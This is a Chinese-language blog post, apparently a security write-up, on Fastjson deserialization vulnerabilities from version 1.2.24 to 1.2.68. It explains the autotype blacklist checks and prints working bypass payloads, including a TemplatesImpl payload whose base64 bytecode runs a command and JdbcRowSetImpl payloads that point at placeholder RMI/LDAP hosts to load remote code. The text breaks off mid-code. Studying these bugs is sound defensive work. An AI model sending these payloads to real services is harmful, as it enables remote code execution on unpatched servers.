    <content type="html"><![CDATA[<h1 id="FastJSON-简介"><a href="#FastJSON-简介" class="headerlink" title="FastJSON 简介"></a>FastJSON 简介</h1><p>FastJson 是一个由阿里巴巴研发的java库，可以把java对象转换为JSON格式，也可以把JSON字符串转换为对象。</p><p><a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a> 👈项目地址</p><p>“自2017年3月15日，fastjson官方主动爆出其在<code>1.2.24</code>及之前版本存在远程代码执行高危安全漏洞以来，各种新型绕过姿势层出不穷。“——c014</p><h1 id="FASTJSON咋用"><a href="#FASTJSON咋用" class="headerlink" title="FASTJSON咋用"></a>FASTJSON咋用</h1><p>答案：直接POM导入，方便地一批</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt;</span><br><span class="line">        &lt;version&gt;x.x.xx&lt;&#x2F;version&gt;</span><br><span class="line">    &lt;&#x2F;dependency&gt;</span><br><span class="line">&lt;&#x2F;dependencies&gt;</span><br></pre></td></tr></table></figure><p>import com.alibaba.fastjson.JSON</p><p>fastjson有两种常见的处理JSON的方法</p><ul><li><code>JSON.toJSONString()</code>方法：可将对象转换成<code>JSON</code>字符串</li><li><code>JSON.parseObject()</code>方法：将<code>JSON</code>字符串转换成对象。</li></ul><p>下面看一波实例：创建一个对象，将其转为JSON，然后再转回对象。<br>同时可以发现，在JSON序列化时，会调用类的getxxx方法；在JSON反序列化时，会调用类的构造方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class App </span><br><span class="line">&#123;</span><br><span class="line">    public static class User&#123;</span><br><span class="line">        private String id;</span><br><span class="line">        User()&#123;</span><br><span class="line">            System.out.println(&quot;User go&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        public void setId(String ids)&#123;</span><br><span class="line">            System.out.println(&quot;setId go&quot;);</span><br><span class="line">            this.id&#x3D;ids;</span><br><span class="line">        &#125;</span><br><span class="line">        public String getId()&#123;</span><br><span class="line">            System.out.println(&quot;GetId go&quot;);</span><br><span class="line">            return this.id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        User a &#x3D; new User();</span><br><span class="line">        String json &#x3D; JSON.toJSONString(a);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">        System.out.println(JSON.parseObject(json,User.class));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User go</span><br><span class="line">GetId go</span><br><span class="line">&#123;&#125;</span><br><span class="line">User go</span><br><span class="line">org.example.App$User@36d4b5c</span><br></pre></td></tr></table></figure><h1 id="FASTJSON-反序列化漏洞起源"><a href="#FASTJSON-反序列化漏洞起源" class="headerlink" title="FASTJSON 反序列化漏洞起源"></a>FASTJSON 反序列化漏洞起源</h1><p>我们可以看到，把JSON反序列化的语句是 JSON.parseObject(json,User.class)，在指定JSON时，还需要指定其所属的类，显得代码就很臃肿，所以开发人员可以使用@type(autotype)字符段来使其不那么臃肿。<br>像下面这样，在JSON通过指定@type的值来实现定位某类。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JSON.parseObject(&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.App$User\&quot;,\&quot;id\&quot;:\&quot;123\&quot;&#125;&quot;)</span><br></pre></td></tr></table></figure><p>虽说这么做很方便，但是以这种方法进行反序列化，会执行类的构造方法和属性相关的get，set方法。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class App </span><br><span class="line">&#123;</span><br><span class="line">    public static class User&#123;</span><br><span class="line">        private String id;</span><br><span class="line">        User()&#123;</span><br><span class="line">            System.out.println(&quot;User go&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        public void setId(String ids)&#123;</span><br><span class="line">            System.out.println(&quot;setId go&quot;);</span><br><span class="line">            this.id&#x3D;ids;</span><br><span class="line">        &#125;</span><br><span class="line">        public String getId()&#123;</span><br><span class="line">            System.out.println(&quot;GetId go&quot;);</span><br><span class="line">            return this.id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        System.out.println(JSON.parseObject(&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.App$User\&quot;,\&quot;id\&quot;:\&quot;123\&quot;&#125;&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User go</span><br><span class="line">setId go</span><br><span class="line">GetId go</span><br><span class="line">&#123;&quot;id&quot;:&quot;123&quot;&#125;</span><br></pre></td></tr></table></figure><p>所以在这个JSON反序列化接口处，我们传入恶意的JSON，就可以调用任意类的构造方法以及属性相关的get，set方法。<br>如果某类的相关方法里有危险的代码（如执行某个命令），我们就可以构造恶意JSON达到RCE的作用。</p><p>另外，JSON.parseObject(“{&quot;@type&quot;:&quot;org.example.App$User&quot;,&quot;id&quot;:&quot;123&quot;}”,Feature.SupportNonPublicField) ，可以直接为private成员赋值（不加Feature.SupportNonPublicField是无法对private成员赋值的）</p><h1 id="各版本复现"><a href="#各版本复现" class="headerlink" title="各版本复现"></a>各版本复现</h1><h2 id="1-2-24"><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h2><h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>是的，就是7U21链里面的TemplatesImplcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</p><p>这个类本身就存在反序列化漏洞，会将成员变量_bytecodes的数据作为类的字节码进行newInsantce操作从而调用其构造方法或static块。故可以fastjson为契机去调用此类。<br>但是由于_name 和_bytecodes 是私有属性，所以需要FASTJSON反序列化接口有Feature.SupportNonPublicField参数才能实现，利用条件很苛刻，但是条件允许的话就很方便，payload打过去就完事。</p><p>“<em>_tfactory这个字段在TemplatesImpl既没有get方法也没有set方法，这没关系，我们设置_tfactory为{ },fastjson会调用其无参构造函数得_tfactory对象，这样就解决了某些版本中在defineTransletClasses()用到会引用_tfactory属性导致异常退出。</em>“</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload</span><br><span class="line">&#123;</span><br><span class="line">  &quot;@type&quot; : &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,</span><br><span class="line">  &quot;_bytecodes&quot; : [&quot;yv66vgAAADQAPQoADQAcCQAdAB4IAB8KACAAIQcAIggAIwoAJAAlCgAkACYKACcAKAcAKQoACgAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwApAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwADgAPBwAuDAAvADABAAVQd25lZAcAMQwAMgAzAQAQamF2YS9sYW5nL1N0cmluZwEABGNhbGMHADQMADUANgwANwA4BwA5DAA6ADsBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAA8AA8BABJ0ZXN0X2Zhc3Rqc29uL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA2VycgEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEAB3dhaXRGb3IBAAMoKUkBAA9wcmludFN0YWNrVHJhY2UAIQAMAA0AAAAAAAQAAQAOAA8AAQAQAAAAHQABAAEAAAAFKrcAAbEAAAABABEAAAAGAAEAAAAJAAEAEgATAAIAEAAAABkAAAADAAAAAbEAAAABABEAAAAGAAEAAAAXABQAAAAEAAEAFQABABIAFgACABAAAAAZAAAABAAAAAGxAAAAAQARAAAABgABAAAAHAAUAAAABAABABUACAAXAA8AAQAQAAAAawAEAAEAAAAmsgACEgO2AAQEvQAFWQMSBlNLuAAHKrYACLYACVenAAhLKrYAC7EAAQAIAB0AIAAKAAIAEQAAAB4ABwAAAAsACAANABIADgAdABEAIAAPACEAEAAlABIAGAAAAAcAAmAHABkEAAEAGgAAAAIAGw&quot;],</span><br><span class="line">  &quot;_name&quot; : &quot;a&quot;,</span><br><span class="line">  &quot;_tfactory&quot; : &#123;&#125;,</span><br><span class="line">  &quot;outputProperties&quot; : &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_bytecodes的类长这样,编译生成Evil.class，将字节码读出并用base64加密，作为_bytecodes</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line">public class Evil extends AbstractTranslet&#123;</span><br><span class="line">static &#123;</span><br><span class="line">            System.err.println(&quot;Pwned&quot;);</span><br><span class="line">            try &#123;</span><br><span class="line">                String[] cmd &#x3D; &#123;&quot;calc&quot;&#125;;</span><br><span class="line">                java.lang.Runtime.getRuntime().exec(cmd).waitFor();</span><br><span class="line">            &#125; catch ( Exception e ) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         @Override</span><br><span class="line">         public void transform(DOM arg0, SerializationHandler[] arg1) throws TransletException &#123;</span><br><span class="line">                  &#x2F;&#x2F; anything</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         @Override</span><br><span class="line">         public void transform(DOM arg0, DTMAxisIterator arg1, SerializationHandler arg2) throws TransletException &#123;</span><br><span class="line">                  &#x2F;&#x2F; anything</span><br><span class="line">         &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a><strong>JdbcRowSetImpl</strong></h3><p><strong>com.sun.rowset.JdbcRowSetImpl</strong>,通过JNDI注入来实现RCE。但需注意JNDI注入有JDK版本限制，高版本需要进行绕过。</p><p>我们的payload一般长这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;ip:port&#x2F;Exploit&quot;,&quot;autoCommit&quot;:true&#125;</span><br><span class="line">or</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;ip:1099&#x2F;exp&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>把这个payload打过去，会执行setAutoCommit()，又setAutoCommit()执行了connct()函数，其如下。<br>connect()会对dataSourceName属性进行一个InitialContext.lookup(dataSourceName),从而实现JNDI注入。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private Connection connect() throws SQLException &#123;</span><br><span class="line">        if(this.conn !&#x3D; null) &#123;</span><br><span class="line">            return this.conn;</span><br><span class="line">        &#125; else if(this.getDataSourceName() !&#x3D; null) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                InitialContext var1 &#x3D; new InitialContext();</span><br><span class="line">                DataSource var2 &#x3D; (DataSource)var1.lookup(this.getDataSourceName());</span><br><span class="line">                return this.getUsername() !&#x3D; null &amp;&amp; !this.getUsername().equals(&quot;&quot;)?var2.getConnection(this.getUsername(), this.getPassword()):var2.getConnection();</span><br><span class="line">            &#125; catch (NamingException var3) &#123;</span><br><span class="line">                throw new SQLException(this.resBundle.handleGetObject(&quot;jdbcrowsetimpl.connect&quot;).toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return this.getUrl() !&#x3D; null?DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()):null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-25"><a href="#1-2-25" class="headerlink" title="1.2.25"></a>1.2.25</h2><h3 id="更新机制"><a href="#更新机制" class="headerlink" title="更新机制"></a>更新机制</h3><p>1.2.24及以前版本就跟白纸一样随便打，在1.2.25开始加入了黑白名单机制</p><p>我们继续用1.2.24的payload（这里用TemplatesImpl的payload）去打，会发现报错autotype不支持</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907163503833.png" alt="image-20210907163503833"></p><p>究其原因，是因为在com.alibaba.fastjson.parser.ParserConfig 加入了CheckAutoType方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.alibaba.fastjson.parser.ParserConfig !public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass)</span><br></pre></td></tr></table></figure><p><strong>在其中有个autotypesupport属性，如果为false，那么就会检测json中@type的值 开头是否与黑名单中的值一样，若一样就直接返回一个异常，然后加载白名单中的类</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (!autoTypeSupport) &#123;</span><br><span class="line">\\黑名单检测，classname是传入类的全名，denyList是黑名单</span><br><span class="line">            for (int i &#x3D; 0; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">                String deny &#x3D; denyList[i];</span><br><span class="line">                if (className.startsWith(deny)) &#123;</span><br><span class="line">                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            for (int i &#x3D; 0; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">                String accept &#x3D; acceptList[i];</span><br><span class="line">                if (className.startsWith(accept)) &#123;</span><br><span class="line">                    clazz &#x3D; TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line"></span><br><span class="line">                    if (expectClass !&#x3D; null &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());</span><br><span class="line">                    &#125;</span><br><span class="line">                    return clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907164922626.png" alt="image-20210907164922626">黑名单长这样</p><p><strong>若autotypesupport开启，则会先白名单加载，后黑名单检测</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (autoTypeSupport || expectClass !&#x3D; null) &#123;</span><br><span class="line">    for (int i &#x3D; 0; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">        String accept &#x3D; acceptList[i];</span><br><span class="line">        if (className.startsWith(accept)) &#123;</span><br><span class="line">            return TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (int i &#x3D; 0; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">        String deny &#x3D; denyList[i];</span><br><span class="line">        if (className.startsWith(deny)) &#123;</span><br><span class="line">            throw new JSONException(&quot;autoType is not support. &quot; + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后面的许多更新都是对checkAutotype以及本身某些逻辑缺陷导致的漏洞进行修复，以及黑名单的不断增加。</p><h3 id="bypass-1（L-法）1-2-25-1-2-41"><a href="#bypass-1（L-法）1-2-25-1-2-41" class="headerlink" title="bypass 1（L;法）1.2.25-1.2.41"></a>bypass 1（L;法）1.2.25-1.2.41</h3><p>当autoTypeSupport开启或expectClass不为空时，会调用一个loadclass方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (this.autoTypeSupport || expectClass !&#x3D; null) &#123;</span><br><span class="line">    clazz &#x3D; TypeUtils.loadClass(typeName, this.defaultClassLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在其中，若类名以L开头；结尾，则会把这两个字符去掉并加载类。</p><p>“至于为什么会有这种奇怪的处理，L 和 ; 这一对字符其实是 JVM 字节码中用来表示类名的：”</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)) &#123;</span><br><span class="line">    String newClassName &#x3D; className.substring(1, className.length() - 1);</span><br><span class="line">    return loadClass(newClassName, classLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以在autotypesupport开启时，我们可以构造如下payload来bypass</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;ip:1099&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>如何开启autotypesupport？只需在json被解析前加入如下代码即可</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br></pre></td></tr></table></figure><h3 id="bypass-2（json内置）1-2-25-1-2-47"><a href="#bypass-2（json内置）1-2-25-1-2-47" class="headerlink" title="bypass 2（json内置）1.2.25-1.2.47"></a>bypass 2（json内置）1.2.25-1.2.47</h3><ul><li><p>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；</p></li><li><p>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="1-2-42"><a href="#1-2-42" class="headerlink" title="1.2.42"></a>1.2.42</h2><h3 id="更新机制-1"><a href="#更新机制-1" class="headerlink" title="更新机制"></a>更新机制</h3><p>42版本中开发人员将明文黑名单改成了hash黑名单，已经有人碰撞出了不少，意义不大；在处理25黑名单绕过的时候做了一个校验，如果类名以<code>L</code>开头，<code>;</code>结尾，则会用stubstring处理一下(这个判断是由HASH来判断的，看不懂，但我大受震撼）：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L &#x3D;&#x3D; 655701488918567152L) &#123;</span><br><span class="line">    className &#x3D; className.substring(1, className.length() - 1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="bypass（双写绕过）"><a href="#bypass（双写绕过）" class="headerlink" title="bypass（双写绕过）"></a>bypass（双写绕过）</h3><p>那么直接一手双写绕过</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,</span><br><span class="line">    &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;127.0.0.1:2357&#x2F;Command8&quot;,</span><br><span class="line">    &quot;autoCommit&quot;:true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-42-1"><a href="#1-2-42-1" class="headerlink" title="1.2.42"></a>1.2.42</h2><h3 id="更新机制-2"><a href="#更新机制-2" class="headerlink" title="更新机制"></a>更新机制</h3><p>针对双写绕过套了个子判断。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L &#x3D;&#x3D; 655701488918567152L) &#123;</span><br><span class="line">                if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L &#x3D;&#x3D; 655656408941810501L) &#123;</span><br><span class="line">                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                className &#x3D; className.substring(1, className.length() - 1);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><p>TypeUtils.loadClass 中除了对L;进行判断，还有对[进行了判断</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#125; else if (className.charAt(0) &#x3D;&#x3D; &#39;[&#39;) &#123;</span><br><span class="line">    Class&lt;?&gt; componentType &#x3D; loadClass(className.substring(1), classLoader);</span><br><span class="line">    return Array.newInstance(componentType, 0).getClass();</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>围绕这个展开，构造如下payload，具体为啥这么构造没有细跟，反正跟[有关</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;@type&quot; : &quot;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;[,&#123;</span><br><span class="line">  &quot;_bytecodes&quot; : [&quot;yv66vgAAADQAPQoADQAcCQAdAB4IAB8KACAAIQcAIggAIwoAJAAlCgAkACYKACcAKAcAKQoACgAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwApAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwADgAPBwAuDAAvADABAAVQd25lZAcAMQwAMgAzAQAQamF2YS9sYW5nL1N0cmluZwEABGNhbGMHADQMADUANgwANwA4BwA5DAA6ADsBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAA8AA8BABJ0ZXN0X2Zhc3Rqc29uL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA2VycgEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEAB3dhaXRGb3IBAAMoKUkBAA9wcmludFN0YWNrVHJhY2UAIQAMAA0AAAAAAAQAAQAOAA8AAQAQAAAAHQABAAEAAAAFKrcAAbEAAAABABEAAAAGAAEAAAAJAAEAEgATAAIAEAAAABkAAAADAAAAAbEAAAABABEAAAAGAAEAAAAXABQAAAAEAAEAFQABABIAFgACABAAAAAZAAAABAAAAAGxAAAAAQARAAAABgABAAAAHAAUAAAABAABABUACAAXAA8AAQAQAAAAawAEAAEAAAAmsgACEgO2AAQEvQAFWQMSBlNLuAAHKrYACLYACVenAAhLKrYAC7EAAQAIAB0AIAAKAAIAEQAAAB4ABwAAAAsACAANABIADgAdABEAIAAPACEAEAAlABIAGAAAAAcAAmAHABkEAAEAGgAAAAIAGw&quot;],</span><br><span class="line">  &quot;_name&quot; : &quot;a&quot;,</span><br><span class="line">  &quot;_tfactory&quot; : &#123;&#125;,</span><br><span class="line">  &quot;outputProperties&quot; : &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-44"><a href="#1-2-44" class="headerlink" title="1.2.44"></a>1.2.44</h2><h3 id="更新机制-3"><a href="#更新机制-3" class="headerlink" title="更新机制"></a>更新机制</h3><p>44版本针对43版本的绕过作了处理，[ 开头或者 L 开头 ; 结尾都会抛出异常</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907182521116.png" alt="image-20210907182521116"></p><h3 id="Bypass-1"><a href="#Bypass-1" class="headerlink" title="Bypass"></a>Bypass</h3><p>JSON内置完美击破</p><h2 id="1-2-47-67"><a href="#1-2-47-67" class="headerlink" title="1.2.47-67"></a>1.2.47-67</h2><h3 id="更新机制-4"><a href="#更新机制-4" class="headerlink" title="更新机制"></a>更新机制</h3><p>由于47修复了JSON内置绕过，这些版本里也没啥很好的绕过方法，网上多是从黑名单中结合JNDI注入找漏网之鱼（找到的多为组件类，需要目标机器上有该组件才能打<a href="https://paper.seebug.org/1155/%EF%BC%89%E4%BB%A5%E5%8F%8AexpectClass%E7%BB%95%E8%BF%87AutoType">https://paper.seebug.org/1155/）以及expectClass绕过AutoType</a></p><h2 id="1-2-68"><a href="#1-2-68" class="headerlink" title="1.2.68"></a>1.2.68</h2><p>68版本之后出现了新的安全控制点safeMode，如果开启，在checkAtuoType的时候会直接抛出异常，只要设置@type类型，想反序列化指定类对象的时候，就会抛异常，也就是说开了safemod的站可以不用看了。<br>当然这个版本expectClass绕过AutoType是可以打一打的。</p><h3 id="Bypass-expectClass绕过AutoType-lt-1-2-68"><a href="#Bypass-expectClass绕过AutoType-lt-1-2-68" class="headerlink" title="Bypass expectClass绕过AutoType  &lt;=1.2.68"></a>Bypass expectClass绕过AutoType  &lt;=1.2.68</h3><p>这里通过一个demo展示一下.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class VulAutoCloseable implements AutoCloseable &#123;</span><br><span class="line">    public VulAutoCloseable()&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void close() throws Exception &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们的payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class evil &#123;</span><br><span class="line">        public static void main(String[] args)&#123;</span><br><span class="line">            